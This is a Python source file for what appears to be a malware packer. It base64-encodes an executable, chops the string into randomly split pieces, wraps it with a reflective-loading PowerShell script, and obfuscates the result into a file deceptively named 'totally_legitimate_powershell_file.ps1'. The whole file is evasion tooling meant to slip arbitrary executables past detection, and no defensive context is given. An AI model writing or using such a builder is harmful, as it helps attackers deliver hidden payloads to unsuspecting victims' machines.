import base64
import random

import PyFuscation
import files


class Builder:
    def __init__(self, exe_file, output_file="/tmp/totally_legitimate_powershell_file.ps1"):
        self.exe_file = exe_file
        self.output_file = output_file


def base64_exe(exe_file):
    with open(exe_file, "rb") as file:
        based = file.read()
        based = base64.b64encode(based).decode()
    return based


def chop_string(string):
    indices = random.choices(range(1, len(string) - 1), k=8)
    chopped = []
    previous = 0
    for i in sorted(indices):
        chopped.append(string[previous:i])
        previous = i
    chopped.append(string[previous:])
    return "'+'".join(chopped)


def read_file(filename):
    with open(filename, "r") as file:
        return file.read()


def template_file():
    return read_file(files.template_file)


def script_file():
    return read_file(files.reflect_file)


def write_final_file(output_file_content, output_file_name):
    print("writing file to " + output_file_name)
    with open(output_file_name, "w") as file:
        file.write(output_file_content)


def obfuscate(script):
    obfuscator = PyFuscation.Obfuscator(script)
    obfuscator.main()
    return obfuscator.script


def build_final_script(exe_file):
    template = template_file()
    payload = base64_exe(exe_file)
    print("chopping up exe " + exe_file)
    payload = chop_string(payload)
    invoke_script = script_file()
    print("adding to powershell script")
    script = template.format(payload, invoke_script)
    script = obfuscate(script)
    return script
